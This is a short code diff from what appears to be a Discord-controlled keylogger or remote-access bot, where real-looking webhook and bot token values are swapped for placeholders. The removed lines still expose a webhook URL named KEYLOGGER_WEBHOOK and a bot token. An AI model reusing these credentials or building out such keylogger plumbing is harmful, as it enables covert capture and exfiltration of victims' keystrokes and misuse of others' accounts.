@@ -40,11 +40,11 @@ from libraries import layn
 
 
 
-GUILD = discord.Object(id = "1369090728025784371")
+GUILD = discord.Object(id = "ID CANAL")
 CHANNEL = 1369090728025784376
-KEYLOGGER_WEBHOOK = "https://discord.com/api/webhooks/1369090782992269433/ijyN0tsXL15CmZkqxTDwe-QUvZJSPdVKYFqCX70lqI4UgCsm1gdOkQk8bFDM7zQzsrlZ"
+KEYLOGGER_WEBHOOK = "WEBHOOK DISCORD"
 CURRENT_AGENT = 0
-BOT_TOKEN = "MTM2OTA5MDU5MzQwNTUzODM0OA.GOSw0t.NbyxS64-JtV-OubvX7fm6PxhPoaf-_7zjuSUcY"
+BOT_TOKEN = "TOKEN BOT"
 
 class Bot(commands.Bot):
     def __init__(self):
